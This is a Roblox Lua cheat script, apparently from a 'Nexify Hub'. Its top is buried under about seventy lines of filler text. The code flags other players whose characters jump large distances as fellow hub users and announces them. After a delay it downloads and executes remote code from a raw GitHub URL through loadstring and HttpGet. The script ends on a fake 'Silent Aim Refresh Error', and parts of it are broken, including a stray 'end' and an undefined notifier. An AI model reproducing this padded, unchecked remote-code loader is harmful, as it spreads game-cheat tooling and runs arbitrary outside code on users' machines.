        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas

--]]


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")


local teleportThreshold = 7300  


local notifiedPlayers = {}


local function checkPlayerTeleportation(player)
    
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local previousPosition = humanoidRootPart.Position

    
    local heartbeatConnection
    heartbeatConnection = RunService.Heartbeat:Connect(function()
        
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local currentPosition = player.Character.HumanoidRootPart.Position
            local distanceMoved = (currentPosition - previousPosition).Magnitude

            
            if distanceMoved > teleportThreshold and not notifiedPlayers[player.Name] then
                
                Notification:Notify(
                    {Title = "Nexify | NEW Nexify USER", Description = "New Nexify Hub User: " .. player.Name},
                    {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 11, Type = "image"},
                    {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
                )
                
                
                notifiedPlayers[player.Name] = true
                wait(16)
                
                
                loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/externalsc.lua"))()
            end

            
            previousPosition = currentPosition
        else
            
            heartbeatConnection:Disconnect()
        end
    end)
end


local function startTeleportationChecks()
    
    for _, player in pairs(Players:GetPlayers()) do
        coroutine.wrap(checkPlayerTeleportation)(player)  
    end

    
    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function(character)
            coroutine.wrap(checkPlayerTeleportation)(player)  
        end)
    end)
end


startTeleportationChecks()
end

--hi

-- I dont use chatgpt or ai :)
error("Silent Aim Refresh Error")
